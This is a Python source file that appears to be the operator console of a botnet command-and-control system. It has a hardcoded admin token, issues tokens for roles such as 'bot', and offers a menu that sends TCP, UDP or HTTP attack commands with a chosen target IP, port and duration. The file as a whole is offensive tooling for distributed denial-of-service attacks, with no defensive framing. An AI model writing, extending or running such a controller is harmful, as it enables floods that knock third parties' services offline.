import requests
import time
import json

SERVER_URL = "http://localhost"
SERVER_PORT = 3000
ADMIN_TOKEN = "AD2442e9471b2ff5376b5a70486379f7"

RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
CYAN = "\033[36m"
BOLD = "\033[1m"

headers = {"Authorization": ADMIN_TOKEN}

def log(message: str, level="info"):
    colors = {
        "info": BLUE,
        "success": GREEN,
        "warning": YELLOW,
        "error": RED
    }
    print(f"{colors.get(level, RESET)}[{level.upper()}] {message}{RESET}")

def question_input(message: str):
    return f"{YELLOW}[{CYAN}?{YELLOW}] {CYAN}{message}{RESET}"

def get_info(key: str = None):
    try:
        req = requests.get(f'{SERVER_URL}:{SERVER_PORT}/info/get', headers=headers)

        if req.status_code == 200:
            data = req.json() 
            
            if key:
                return data.get(key) 
            
            return data
        else:
            print(f"Error: {req.status_code} - {req.text}")
            return None
    except requests.RequestException as e:
        print(f"Connection error: {e}")
        return None

def print_banner():
    ascii_art = f"""
    {YELLOW}[0] Tokens{RESET}
    {YELLOW}[1] Attack{RESET}
    {YELLOW}[2] Get info{RESET}
    """
    print(ascii_art)

def token_choose(): 
    print(chr(27) + "[2J")
    print(f"""
{BOLD}{CYAN}    [0] Create new token
    [1] Revoke token
    [2] Validate token{RESET}
    """)

    try:
        token_opt = int(input("-> "))
    except ValueError:
        log("Invalid input! Please enter a number.", "error")
        return
    
    token = ""
    if token_opt != 0:
        token = input(f"{YELLOW}[?] Insert token: {RESET}")


    if token_opt == 0:
        roles = ['admin', 'operator', 'supervisor', 'bot', 'customer']
        print(chr(27) + "[2J")
        for i, role in enumerate(roles):
            print(f"[{i}] {role}")

        try:
            role_selected = int(input(f"{YELLOW}[?] Select token role: {RESET}"))
            if role_selected not in range(len(roles)):
                raise ValueError
        except ValueError:
            log("Invalid role selection!", "error")
            return
        
        req = requests.post(f"{SERVER_URL}:{SERVER_PORT}/token/new/{roles[role_selected]}", headers=headers)

        if req.status_code != 200:
            log(f"Error: {req.text}", "error")
        else:
            log(f"Token created: {req.text}", "success")
    elif token_opt == 1:
        req = requests.post(f"{SERVER_URL}:{SERVER_PORT}/token/delete/{token}", headers=headers)

        if req.status_code != 200:
            log(f"Error: {req.text}", "error")
        else:
            log(f"Token deleted: {req.text}", "success")
    elif token_opt == 2:
        req = requests.post(f"{SERVER_URL}:{SERVER_PORT}/token/{token}", headers=headers)

        if req.status_code != 200:
            log(f"Error: {req.text}", "error")
        else:
            log(f"Token validated: {req.text}", "success")
    else:
        log("Invalid option selected!", "error")

    time.sleep(2)

def attack():
    print(chr(27) + "[2J")

    status = {
        'PING': 1 << 0,
        'HELLO': 1 << 1,
        'ATTACK_TCP': 1 << 2,
        'ATTACK_UDP': 1 << 3,
        'ATTACK_HTTP': 1 << 4,
        'EXIT': 1 << 5,
    }

    status_string = list(status.keys())

    for i, state in enumerate(status_string):
        print(f"{BOLD}{CYAN}[{i}] {state}{RESET}")

    try:
        attack_opt = int(input(f"{YELLOW}[?] Select status: {RESET}"))
        if attack_opt < 0 or attack_opt >= len(status_string):
            raise ValueError
    except ValueError:
        log("Invalid input! Please enter a valid number.", "error")
        return

    selected_status = status_string[attack_opt]
    status_code = status[selected_status]

    duration = 1
    targetIp = "0.0.0.0"
    targetPort = 1

    if "ATTACK" in selected_status:
        duration = int(input(question_input("Insert attack duration (minutes): ")))
        targetIp = input(question_input("Insert target host (Ipv4 Addr): "))
        targetPort = int(input(question_input("Insert target port: ")))

    try:
        req = requests.post(f'{SERVER_URL}:{SERVER_PORT}/command/run/{status_code}', headers=headers, json={
        'duration': duration,
        'targetIp': targetIp,
        'targetPort': targetPort,
    })

        if req.status_code == 200:
            log(f"Successfully started command: {GREEN}{selected_status}{RESET}.", "success")
        else:
            log(f"Error setting status: {req.text}", "error")
    except requests.RequestException as e:
        log(f"Error contacting server: {e}", "error")


def main():
    while True:
        print(chr(27) + "[2J")
        print_banner()

        try:
            opt = int(input("select -> "))
        except ValueError:
            log("Invalid input! Please enter a number.", "error")
            continue

        match opt:
            case 0:
                token_choose()
            case 1:
                attack()
                break
            case 2:
                print(get_info())
                break
            case _:
                log("Invalid option selected!", "error")

if __name__ == "__main__":
    main()
    exit(0)
